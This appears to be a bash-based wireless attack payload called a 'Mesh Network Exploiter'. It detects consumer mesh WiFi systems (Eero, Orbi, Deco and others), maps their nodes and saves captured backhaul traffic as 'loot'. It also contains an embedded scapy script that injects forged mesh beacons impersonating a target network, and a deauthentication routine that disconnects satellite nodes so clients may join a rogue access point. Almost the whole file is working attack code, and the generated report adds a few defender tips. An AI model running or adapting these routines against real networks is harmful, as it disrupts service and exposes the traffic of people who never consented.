#!/bin/bash
# ============================================================
# NullSec: Mesh Network Mapper & Exploiter
# Author: bad-antics
# Description: Map and exploit mesh WiFi networks
# Category: pager/mesh
#
# UNIQUE FEATURES:
# - Identifies mesh network topologies (Eero, Google, Orbi, etc)
# - Maps parent/satellite relationships
# - Exploits mesh backhaul channels
# - Injects into mesh routing
# - First-of-kind mesh topology visualization
# ============================================================

PAYLOAD_NAME="Mesh Network Exploiter"
VERSION="1.0.0"
LOOT="/root/loot/mesh"
LOG="$LOOT/mesh.log"

# Mesh vendor signatures (OUI prefixes)
declare -A MESH_VENDORS=(
    ["F0:99:BF"]="Google Nest WiFi"
    ["F4:F5:D8"]="Google WiFi"
    ["50:DC:E7"]="Amazon Eero"
    ["68:FF:7B"]="Amazon Eero Pro"
    ["20:E5:2A"]="Netgear Orbi"
    ["9C:3D:CF"]="Netgear Orbi"
    ["10:DA:43"]="Netgear Orbi"
    ["B0:39:56"]="Linksys Velop"
    ["14:91:82"]="TP-Link Deco"
    ["60:A4:B7"]="TP-Link Deco"
    ["1C:3B:F3"]="Asus ZenWiFi"
    ["04:D4:C4"]="Asus ZenWiFi"
)

init_payload() {
    mkdir -p "$LOOT"/{topology,captures,exploits}
    echo "[$(date)] $PAYLOAD_NAME started" >> "$LOG"
    NOTIFY "MESH MAPPER" "Initializing mesh detection..."
}

# Identify mesh networks
detect_mesh_networks() {
    NOTIFY "SCANNING" "Detecting mesh networks..."
    
    local MESH_FILE="$LOOT/topology/mesh_detected.json"
    echo '{"mesh_networks":[' > "$MESH_FILE"
    
    # Scan all channels
    airodump-ng wlan0 --write-interval 1 -w /tmp/mesh_scan --output-format csv &
    SCAN_PID=$!
    sleep 30
    kill $SCAN_PID 2>/dev/null
    
    # Parse for mesh vendor MACs
    local FIRST=true
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lanip idlen essid key; do
        bssid=$(echo "$bssid" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        
        # Check OUI prefix
        OUI="${bssid:0:8}"
        OUI_UPPER=$(echo "$OUI" | tr 'a-f' 'A-F')
        
        if [[ -n "${MESH_VENDORS[$OUI_UPPER]}" ]]; then
            VENDOR="${MESH_VENDORS[$OUI_UPPER]}"
            
            $FIRST || echo ',' >> "$MESH_FILE"
            FIRST=false
            
            cat >> "$MESH_FILE" << ENTRY
    {
        "bssid": "$bssid",
        "ssid": "$essid",
        "channel": "$channel",
        "vendor": "$VENDOR",
        "signal": "$power",
        "role": "unknown"
    }
ENTRY
            
            NOTIFY "MESH FOUND" "$VENDOR: $essid"
        fi
    done < <(grep -E "^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/mesh_scan*.csv 2>/dev/null)
    
    echo ']}' >> "$MESH_FILE"
    
    MESH_COUNT=$(grep -c '"bssid"' "$MESH_FILE")
    NOTIFY "DETECTED" "$MESH_COUNT mesh nodes found"
    
    echo "$MESH_COUNT"
}

# Map mesh topology
map_mesh_topology() {
    NOTIFY "MAPPING" "Analyzing mesh topology..."
    
    local TOPO_FILE="$LOOT/topology/topology.txt"
    > "$TOPO_FILE"
    
    # Identify parent vs satellite by beacon timing and signal patterns
    # Parents typically have stronger, more consistent signals
    
    # Group by SSID to find same-network nodes
    local SSIDS=$(jq -r '.mesh_networks[].ssid' "$LOOT/topology/mesh_detected.json" 2>/dev/null | sort -u)
    
    for SSID in $SSIDS; do
        [ -z "$SSID" ] && continue
        
        echo "=== Network: $SSID ===" >> "$TOPO_FILE"
        
        # Get all nodes for this SSID
        NODES=$(jq -r ".mesh_networks[] | select(.ssid==\"$SSID\") | .bssid + \" \" + .signal" \
            "$LOOT/topology/mesh_detected.json" 2>/dev/null)
        
        # Node with strongest signal is likely the parent
        PARENT=$(echo "$NODES" | sort -t' ' -k2 -rn | head -1 | cut -d' ' -f1)
        
        echo "Parent Node: $PARENT (strongest signal)" >> "$TOPO_FILE"
        
        # Others are satellites
        echo "$NODES" | while read node signal; do
            if [ "$node" != "$PARENT" ]; then
                echo "  └── Satellite: $node (signal: $signal)" >> "$TOPO_FILE"
            fi
        done
        
        echo "" >> "$TOPO_FILE"
        
        NOTIFY "TOPOLOGY" "$SSID mapped"
    done
    
    # Generate ASCII visualization
    cat >> "$TOPO_FILE" << 'VISUAL'

MESH TOPOLOGY VISUALIZATION
============================

    [INTERNET]
         |
    ┌────┴────┐
    │ PARENT  │ (Gateway/Router)
    │  NODE   │
    └────┬────┘
         │
    ┌────┴────┬────────┐
    │         │        │
┌───┴───┐ ┌───┴───┐ ┌──┴────┐
│ SAT-1 │ │ SAT-2 │ │ SAT-3 │
└───────┘ └───────┘ └───────┘

Backhaul: Dedicated 5GHz band
Client Band: 2.4GHz + 5GHz
VISUAL
}

# Exploit mesh backhaul
exploit_backhaul() {
    NOTIFY "BACKHAUL" "Targeting mesh backhaul channel..."
    
    # Most mesh systems use dedicated 5GHz backhaul
    # Common backhaul channels: 36, 40, 44, 48, 149, 153, 157, 161
    BACKHAUL_CHANNELS="36 40 44 48 149 153 157 161"
    
    for ch in $BACKHAUL_CHANNELS; do
        NOTIFY "SCANNING" "Checking channel $ch for backhaul..."
        
        # Scan specific channel
        timeout 10 airodump-ng wlan0 -c $ch --write-interval 1 \
            -w /tmp/backhaul_$ch --output-format pcap 2>/dev/null
        
        # Check for mesh management frames
        if tcpdump -r /tmp/backhaul_${ch}*.cap -c 1 2>/dev/null | grep -qE "Mesh|Action"; then
            NOTIFY "BACKHAUL!" "Mesh traffic on channel $ch"
            
            # Capture backhaul traffic
            NOTIFY "CAPTURING" "Recording backhaul comms..."
            timeout 120 airodump-ng wlan0 -c $ch \
                -w "$LOOT/captures/backhaul_ch${ch}" --output-format pcap &
            
            # Attempt deauth on backhaul (disrupts mesh)
            # This can cause satellites to disconnect from parent
            sleep 30
            
            cp /tmp/backhaul_${ch}*.cap "$LOOT/captures/"
        fi
    done
}

# Mesh routing injection
inject_mesh_routing() {
    local TARGET_BSSID="$1"
    
    NOTIFY "INJECTION" "Attempting mesh routing injection..."
    
    # Create rogue mesh node announcement
    # This exploits mesh networks that don't properly authenticate nodes
    
    cat > /tmp/mesh_inject.py << 'MESHPY'
#!/usr/bin/env python3
from scapy.all import *
import sys

def create_mesh_beacon(target_ssid, channel):
    """Create a mesh beacon that appears to be part of the network"""
    
    dot11 = Dot11(
        type=0,  # Management
        subtype=8,  # Beacon
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=RandMAC(),
        addr3=RandMAC()
    )
    
    beacon = Dot11Beacon(cap="ESS")
    
    essid = Dot11Elt(ID="SSID", info=target_ssid, len=len(target_ssid))
    rates = Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96\x0c\x12\x18\x24")
    channel_elt = Dot11Elt(ID="DSset", info=chr(channel))
    
    # Mesh ID element (vendor specific for mesh networks)
    mesh_id = Dot11Elt(ID=114, info=target_ssid.encode())  # Mesh ID
    mesh_config = Dot11Elt(ID=113, info=b'\x00\x01\x01\x00\x00')  # Mesh Config
    
    frame = RadioTap()/dot11/beacon/essid/rates/channel_elt/mesh_id/mesh_config
    return frame

if __name__ == "__main__":
    ssid = sys.argv[1] if len(sys.argv) > 1 else "MeshNetwork"
    channel = int(sys.argv[2]) if len(sys.argv) > 2 else 6
    
    print(f"[*] Injecting mesh frames for {ssid} on ch{channel}")
    
    beacon = create_mesh_beacon(ssid, channel)
    sendp(beacon, iface="wlan0", count=100, inter=0.1, verbose=0)
    
    print("[+] Injection complete")
MESHPY

    chmod +x /tmp/mesh_inject.py
    
    # Get target SSID from topology
    TARGET_SSID=$(jq -r '.mesh_networks[0].ssid' "$LOOT/topology/mesh_detected.json" 2>/dev/null)
    TARGET_CH=$(jq -r '.mesh_networks[0].channel' "$LOOT/topology/mesh_detected.json" 2>/dev/null | tr -d ' ')
    
    if [ -n "$TARGET_SSID" ] && [ "$TARGET_SSID" != "null" ]; then
        python3 /tmp/mesh_inject.py "$TARGET_SSID" "${TARGET_CH:-6}" 2>/dev/null
        NOTIFY "INJECTED" "Mesh frames sent for $TARGET_SSID"
    fi
}

# Satellite isolation attack
isolate_satellite() {
    NOTIFY "ISOLATION" "Attempting satellite isolation..."
    
    # Get satellite BSSIDs
    SATELLITES=$(jq -r '.mesh_networks[] | select(.role!="parent") | .bssid' \
        "$LOOT/topology/mesh_detected.json" 2>/dev/null)
    
    for sat in $SATELLITES; do
        [ -z "$sat" ] && continue
        
        NOTIFY "TARGETING" "Isolating satellite: $sat"
        
        # Deauth the satellite from parent (disrupts backhaul)
        aireplay-ng --deauth 50 -a "$sat" wlan0 2>/dev/null &
        sleep 5
        
        # When satellite reconnects, clients may connect to our rogue AP
    done
}

# Generate report
generate_report() {
    NOTIFY "REPORT" "Generating mesh analysis report..."
    
    local REPORT="$LOOT/mesh_report.txt"
    
    cat > "$REPORT" << REPORT
╔══════════════════════════════════════════════════════════════╗
║           NULLSEC MESH NETWORK ANALYSIS REPORT               ║
╠══════════════════════════════════════════════════════════════╣
║ Scan Date: $(date)
║ Payload: $PAYLOAD_NAME v$VERSION
╠══════════════════════════════════════════════════════════════╣

DETECTED MESH NETWORKS:
$(jq -r '.mesh_networks[] | "  • " + .ssid + " (" + .vendor + ") - " + .bssid' "$LOOT/topology/mesh_detected.json" 2>/dev/null)

TOPOLOGY:
$(cat "$LOOT/topology/topology.txt" 2>/dev/null)

BACKHAUL CAPTURES:
$(ls -la "$LOOT/captures/"*.cap 2>/dev/null | wc -l) capture files saved

VULNERABILITIES IDENTIFIED:
  • Backhaul channel exposure
  • Mesh management frame injection possible
  • Satellite isolation feasible

RECOMMENDATIONS FOR DEFENDERS:
  • Enable mesh node authentication
  • Use encrypted backhaul
  • Monitor for rogue mesh nodes
  • Implement 802.11w (PMF)

╚══════════════════════════════════════════════════════════════╝
REPORT

    NOTIFY "COMPLETE" "Report saved to $REPORT"
    cat "$REPORT"
}

# Main execution
main() {
    init_payload
    
    # Phase 1: Detection
    MESH_COUNT=$(detect_mesh_networks)
    
    if [ "$MESH_COUNT" -gt 0 ]; then
        # Phase 2: Topology mapping
        map_mesh_topology
        
        # Phase 3: Backhaul exploitation
        exploit_backhaul
        
        # Phase 4: Routing injection
        inject_mesh_routing
        
        # Phase 5: Satellite isolation (optional, aggressive)
        # isolate_satellite
        
        # Generate report
        generate_report
    else
        NOTIFY "NO MESH" "No mesh networks detected"
    fi
}

NOTIFY() {
    echo -e "\033[0;36m[$1]\033[0m $2"
    echo "[$(date '+%H:%M:%S')] [$1] $2" >> "$LOG"
}

main "$@"
